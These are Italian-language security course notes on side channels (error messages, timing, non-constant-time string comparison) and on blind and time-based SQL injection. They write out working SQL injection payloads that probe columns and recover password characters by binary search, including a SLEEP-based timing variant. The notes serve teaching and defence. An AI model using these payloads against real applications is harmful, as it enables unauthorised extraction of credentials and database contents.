Molto spesso le applicazioni possiedono **side effects**, ovvero fenomeni osservabili che rispecchiano lo stato interno dell'applicazione.
Se un _side effect_ dipende su un valore segreto allora abbiamo **leak parziale**, se il leak è grande abbastanza per recuperare un segreto allora abbiamo un attacco.

Un esempio banale è quello del **bute-force** di una password: ad ogni iterazione l'attaccante sa che una certa password non è corretta, bisogna quindi rallentare i controlli della password e/o disabilitare l'utente dopo qualche tentativo.

**Esempi di side channels**:
- Errori
- Tempo
- Contenuto
- Grandezza
- Consumo energetico
- Emissioni elettromagnetiche

Per <u>contrastare i leak da parte degli errori</u> è possibile **minimizzare l'errore** ovvero non dare informazioni dettagliate (e.g. se l'username o la password sono sbagliati potrebbe essere ritornato "wrong credentials").

Anche se l'errore viene ridotto, è pur sempre possibile osservare il tempo, magari l'errore viene ritornato più velocemente se è solo l'utente ad essere sbagliato.

Il confronto di stringhe ad esempio può essere più lento in base a "quanto differiscono":
```c
"aaaaa" == "aaaaa" // potrebbe essere più lento
"aaaaa" == "aaabb" // il confronto termina al quarto carattere
"aaaaa" == "a" // tipicamente più veloce a fallire
```

Un attaccante potrebbe andare ad indovinare un carattere alla volta controllando quando il tempo impiegato per il confronto è più alto:
```c
"axxxx" == "*****"
"abxxx" == "*****"
// ...
```

La soluzione è usare funzioni **time-safe**, in PHP `hash_equals` compara due stringhe impiegando sempre lo stesso tempo.

## Blind SQL injection
Questo tipo di injection sfrutta un side channel per eseguire il leak di informazioni, solitamente viene usato quando il risultato della query non viene mostrato nella pagina web.

In base al successo o meno della query, l'applicazione potrebbe mostrare:
- Un messaggio
- Un errore
- Una pagina "rotta"
- Una pagina vuota

Consideriamo un servizio di **recupero password** dove se l'utente esiste viene mandata una mail di recupero, altrimenti un errore viene mostrato.
>Nessuna informazione viene mostrata, ma l'errore dipende dalla query.

Supponiamo che la query che controlla l'esistenza della mail (data in input) nel database sia:
```sql
SELECT 1 FROM ... WHERE ... email='EMAIL'
```

L'effetto di `EMAIL=' OR 1 #` è quello di far riuscire la query, non esegue il leak di nessun'informazione però ora l'attaccante sa che le injection sono possibili.

La seguente query potrebbe fallire, tuttavia in ogni caso ritornerebbe un risultato distinguibile dal caso di successo:
```sql
SELECT 1
FROM people
WHERE mail='' OR (SELECT 1 FROM users LIMIT 0,1)=1 LIMIT 0,1;
```

Un attaccante può usare la funzione `MID` per controllare l'esistenza di una particolare colonna:
```sql
SELECT 1 FROM people WHERE mail=' ' OR (SELECT MID(password,1,0) FROM people LIMIT 0,1)='' #
```
>In questo caso controlla che esista la colonna.

```sql
' OR (SELECT MID(password,1,1) FROM people LIMIT 0,1)='a' #
```
>In questo caso prova a vedere se il primo carattere della password combacia con 'a'.

È possibile usare una **binary search** per trovare carattere per carattere:
```sql
' OR (SELECT ORD(MID(password,1,1)) FROM people LIMIT 0,1)<=ORD('m') #
FALSE

' OR (SELECT ORD(MID(password,1,1)) FROM people LIMIT 0,1)<=ORD('t') #
FALSE

' OR (SELECT ORD(MID(password,1,1)) FROM people LIMIT 0,1)<=ORD('w') #
FALSE

' OR (SELECT ORD(MID(password,1,1)) FROM people LIMIT 0,1)<=ORD('y') #
TRUE

' OR (SELECT ORD(MID(password,1,1)) FROM people LIMIT 0,1)<=ORD('x') #
TRUE
```
>Worst case: 5 query per i caratteri lowercase ($\log_226 \sim 4.7$).

## Totally blind SQL injection
Nel caso in cui la web app non mostri nessun tipo di risultato l'attaccante può comunque usare il **tempo** come side channel.

L'attaccante può ancora usare la ricerca binaria:
```sql
' OR (SELECT IF(
 (SELECT ORD(MID(password,1,1)) FROM people LIMIT 0,1)<=ORD('m'),
 SLEEP(1),
 NULL)
 ) #
```

Il tempo di _sleep_ deve essere abbastanza per essere osservato da remoto, l'attacco è lento ma può eseguire il leak di tutto il database.
